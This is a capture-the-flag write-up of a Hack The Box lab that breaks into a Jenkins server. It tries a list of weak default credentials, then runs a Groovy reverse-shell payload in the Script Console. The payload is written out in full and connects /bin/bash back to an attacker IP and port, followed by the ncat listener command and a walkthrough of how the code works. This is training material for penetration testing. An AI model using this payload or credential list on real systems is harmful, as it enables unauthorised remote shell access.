# Jenkins and Groovy Script Payload

Note: This cookbook details the exploitation of a Jenkins service, with a particular focus on Groovy scripts, as encountered on an HTB machine.

From the official write-up (prepared by 0ne-nine9 and ilinor): *Jenkins is a free and open-source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and delivery. It is a server-based system.*

After the initial enumeration with Nmap, we opened our browser to explore the service more easily. Navigating to the target's IP address through the URL search bar initially yielded an error, as we needed to specify the port on which the service was running. The scan showed that the service wasn't running on port 80, which is what the browser would expect if only the IP address was entered. However, by specifying the IP combination, we accessed the service without any issues.

And now back to the official write-up: *The potential approach we can explore against this login screen is to try logging in using commonly used weak credential pairs. This relies on the possibility that server administrators might have overlooked configuring the Jenkins service securely. Upon searching the web for common weak credential pairs, we get the following result:*

```
admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1
```

After attempting multiple combinations from the list above, we managed to log-in and look around the administrative panel.

*At the bottom right corner of the page, the current version of the Jenkins service is displayed. This is one of the first clues an attacker will check - specifically if the currently installed version has any known CVE's or attack methods published on the Internet. Unfortunately, this is not our case. The current version is reported as secure. As an alternative, we stumble across two vital pieces of information while searching for Jenkins exposures:*

- [A handbook including multiple ways of gaining Jenkins RCE's](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)

- [A repository similar to the above, including links to scripts and tools](https://github.com/gquere/pwn_jenkins)

*In both links provided above the Jenkins Script Console is mentioned, where what is known as Groovy script can be written and run arbitrarily. To access it, you need to navigate to the left menu, to ```Manage Jenkins > Script Console```, or by visiting the following URL directly from your browser URL search bar: ```http://{target_IP}:8080/script```*

*The objective of our Groovy script implementation as explained in the two documents linked before will be to receive a reverse shell connection from the target. Reverse, in this case, meaning the target will initialize the connection request back to our attacker VM, with simplicity in implementation and a better chance of firewall evasion being the main two reasons. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack.*

The correct payload we are going to use in this example is below:

```
String host = "10.10.14.210";
int port = 8000;
String cmd = "/bin/bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while(!s.isClosed()) {
    while(pi.available() > 0) so.write(pi.read());
    while(pe.available() > 0) so.write(pe.read());
    while(si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e) {}
}
p.destroy();
s.close();
```

Note: the official write-up introduced a small issue in the first line, which was ```String host="{your_IP}";```. In Groovy, strings should be defined with double quotes without the curly braces ```{}``` for variable assignment unless we’re doing interpolation.

And now just a few words about the Groovy payload we have used:

- Defining Variables: obviously, we start by defining the ```host```, ```port```, and ```cmd``` variables. The ```host``` is our IP address, ```port``` is where we’re listening for the connection, and ```cmd``` is the command to execute, in this case, ```/bin/bash```.

- Starting the Process: we use ```ProcessBuilder``` to start a new process (```p```) that runs the ```/bin/bash``` command. ```redirectErrorStream(true)``` merges the standard error into the standard output, so everything goes through the same stream.

- Establishing a Connection: a new ```Socket``` object (```s```) is created to connect to our specified host and port. This socket represents the connection between the target machine and our listener.

- I/O Streams: we then set up input (```pi```, ```pe```, ```si```) and output (```po```, ```so```) streams. ```pi``` and ```pe``` come from the process (```p```), and ```si``` comes from the socket (```s```). ```po``` and ```so``` represent the output streams to the process and the socket, respectively.

- Data Transfer Loop: this loop continuously transfers data between the process and our listener. It reads any available data from the process’s output (```pi```) and error streams (```pe```) and sends it to our listener via ```so```. It also reads data from our listener (```si```) and sends it to the process’s input (```po```).

- Flush and Sleep: the streams are flushed to ensure data is sent immediately, and the thread sleeps for 50 milliseconds to avoid overwhelming the connection.

- Exit Check: the script checks if the process has exited. If it has, the loop breaks, ending the connection.

- Cleanup: finally, the process and socket are closed to clean up resources.

Basic syntax:

- Variables are defined using ```String```, ```int```, etc., followed by the variable name and value.

- Method calls like new ```ProcessBuilder(cmd).start()``` create and start new objects or processes.

- Input/Output Streams are used for reading from and writing to different sources, like processes or sockets.

- Loops control the flow of execution, repeatedly performing actions until a condition is met.

Also, here is something I have noticed about the loops used in this payload:

- Main Loop (Primary Condition): The main loop ```while(!s.isClosed())``` continues to run as long as the socket connection remains open. This loop is the central control structure of the payload. As long as the socket is not closed, the script keeps executing, handling the input/output streams.

- Nested Loops (Conditional Sub-loops): Inside this main loop, we have several while loops that are responsible for reading and writing data between the process (```/bin/bash``` command) and the socket (the connection to your machine). These sub-loops check if there's data available to read (```pi.available() > 0```, ```pe.available() > 0```, ```si.available() > 0```). When data is present, it gets processed and transferred to the appropriate output stream.

- Controlled Execution: The entire structure ensures that data flows smoothly between the process and our listener as long as the socket remains open. If the process (```p```) exits, the loop breaks, terminating the payload execution. The final cleanup with ```p.destroy()``` and ```s.close()``` ensures resources are properly released, preventing any potential issues like resource leaks.

To conclude, this design indeed hinges on a primary condition (the open socket), and once that’s met, the payload unfolds in a controlled manner through its nested loops. Each part of the code depends on the previous steps being successful—this cascading flow ensures the reverse shell functions correctly as long as the main condition (the open socket) is maintained. This structure appears to be common in scripts that manage ongoing connections, where continuous data exchange needs to be handled carefully and conditionally.

After this digression here's what the official write-up has to say about the payload:

*The rest of the script will instruct the target to create a ```cmd``` process which will initialize a connection request to the provided ```host``` and ```port``` (us, in this case). Our listener script will be running on the specified port and catch the connection request from the target, successfully forming a reverse shell between the target and attacker hosts. On our side, this will look like a new connection is received and that we can now type in the target host's terminal. This will not be visible on the target's side unless they are actively monitoring the network activity of their running processes or the outbound connections from their ports.*

*Before running the command pasted in the Jenkins Script Console, we need to make sure our listener script is up and running on the same port as specified in the command above, for example ```int port=8000```. To achieve this, we will use a tool called ```netcat``` or ```nc``` for short.*

Note: I am always preferring ncat over netcat. On modern pentesting tasks, ncat is usually the better choice due to its advanced features, security enhancements, and active maintenance. However, the basic syntax for ncat is very similar to netcat. Here is the command for setting up our listener:

```
ncat -lvnp 8000
```

*Now that our listener is turned on, we can execute the payload by clicking the Run button in the Jenkins Script Console.*

*Next, we can try to interact with the shell by typing in the ```whoami``` and ```id``` commands. These commands help verify our permission level on the target system. From the output, we can quickly determine that we rest at the highest level of privilege. We have command execution. Navigate to the ```/root``` directory on the target and read the flag.*

This example is now concluded.
